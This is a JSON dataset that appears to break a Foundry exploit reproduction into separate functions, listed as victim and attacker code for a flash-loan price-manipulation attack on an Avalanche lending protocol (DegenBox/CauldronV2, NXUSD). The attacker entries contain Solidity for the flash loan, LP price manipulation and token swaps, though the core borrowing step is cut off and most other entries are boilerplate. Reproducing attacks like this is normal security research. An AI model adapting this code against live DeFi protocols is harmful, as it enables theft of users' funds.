[
  {
    "contract/interface": "IDegenBox",
    "source_type": "victim_contract",
    "function_name": "masterContractApproved",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDegenBox",
    "source_type": "victim_contract",
    "function_name": "setMasterContractApproval",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "_amounts",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "_assets",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "_modes",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "actions",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "buyWAVAXAndAddLP",
    "original_code": "    function buyWAVAXAndAddLP() public {\n        address[] memory path = new address[](2);\n        path[0] = address(USDC);\n        path[1] = address(WAVAX);\n        Router.swapExactTokensForTokens(280_000 * 1e6, 0, path, address(this), block.timestamp);\n        Router.addLiquidity(\n            address(USDC),\n            address(WAVAX),\n            260_000 * 1e6,\n            500_000 * 1e18,\n            250_000 * 1e6,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] memory assets,\n        uint256[] memory amounts,\n        uint256[] memory premiums,\n        address initiator,\n        bytes memory params\n    ) public returns (bool) {\n        assets;\n        amounts;\n        premiums;\n        params;\n        initiator;\n        // get LP token\n        buyWAVAXAndAddLP();\n        // change LP price\n        address[] memory path = new address[](2);\n        path[0] = address(USDC);\n        path[1] = address(WAVAX);\n        Router.swapExactTokensForTokens(USDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n\n        /*\n         * borrow NXUSD\n        */\n        // set contract apporval\n        NXUSD.approve(address(CRVPool1), type(uint256).max);\n        Pair.approve(address(DegenBox), type(uint256).max);\n        DegenBox.setMasterContractApproval(address(this), masterContract, true, 0, 0, 0);\n        // update rate\n        CauldronV2.updateExchangeRate();\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "sellUSDC_e",
    "original_code": "    function sellUSDC_e() public {\n        address[] memory path = new address[](2);\n        USDC_e.approve(address(Router), type(uint256).max);\n        path[0] = address(USDC_e);\n        path[1] = address(USDC);\n        Router.swapExactTokensForTokens(USDC_e.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "sellWAVAX",
    "original_code": "    function sellWAVAX() public {\n        address[] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(USDC);\n        Router.swapExactTokensForTokens(WAVAX.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 19_613_451);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        USDC.approve(address(Router), type(uint256).max);\n        WAVAX.approve(address(Router), type(uint256).max);\n        // AAVE flashloan\n        aaveLendingPool.flashLoan(address(this), _assets, _amounts, _modes, address(this), new bytes(1), 0);\n\n        emit log_named_uint(\"After exploit repaid, profit in USDC of attacker:\", USDC.balanceOf(address(this)) / 1e6);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "values",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICauldronV2",
    "source_type": "victim_contract",
    "function_name": "cook",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICauldronV2",
    "source_type": "victim_contract",
    "function_name": "updateExchangeRate",
    "original_code": "",
    "description": ""
  }
]